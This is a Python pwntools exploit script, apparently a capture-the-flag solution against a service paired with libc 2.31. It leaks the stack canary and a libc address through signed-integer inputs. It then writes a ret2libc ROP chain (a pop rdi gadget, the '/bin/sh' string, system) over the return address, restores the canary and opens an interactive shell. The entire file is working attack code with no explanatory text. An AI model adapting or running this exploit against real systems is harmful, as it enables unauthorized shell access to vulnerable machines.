from pwn import *

l = ELF("./libc-2.31.so", checksec=False)

HOST = "0.0.0.0"
PORT = 5000

r = remote(HOST, PORT)

def unsign(x):
    if(x < 0):
        x += 2**32
    return x

def leak(pad):
    p = '2147483647 '*pad
    r.sendlineafter(" :\n", p[:-1])
    r.sendlineafter("> ", '2')

    r.recvuntil(":\n")
    res = unsign(int(r.recvline().split(" ")[0]))
    r.sendlineafter("> ", 'n')
    return res

def overwrite(inx, val, resp='n'):
    p = '-2147483648 '*inx
    p += str(val)
    r.sendlineafter(" :\n", p)
    r.sendlineafter("> ", '1')
    r.sendlineafter("> ", resp)


# leak memory address
canary = [leak(30), leak(31)]
libc_addr = leak(34) | (leak(35) << 32)

l.address = libc_addr - l.symbols["__libc_start_main"] - 243

pop_rdi = l.address + 0x26b72
binsh = next(l.search("/bin/sh\x00"))
sys = l.symbols['system']


# overwrite ret addr

# system
overwrite(41, sys >> 32)
overwrite(40, sys & (2**32 - 1))

# string '/bin/sh'
overwrite(39, binsh >> 32)
overwrite(38, binsh & (2**32 - 1))

# pop rdi ; ret
overwrite(37, pop_rdi >> 32)
overwrite(36, pop_rdi & (2**32 - 1))

# padding (ret => align 0x10)
overwrite(35, (pop_rdi+1) >> 32)
overwrite(34, (pop_rdi+1) & (2**32 - 1))

# canary
overwrite(31, canary[1])
overwrite(30, canary[0], 'y')

r.interactive()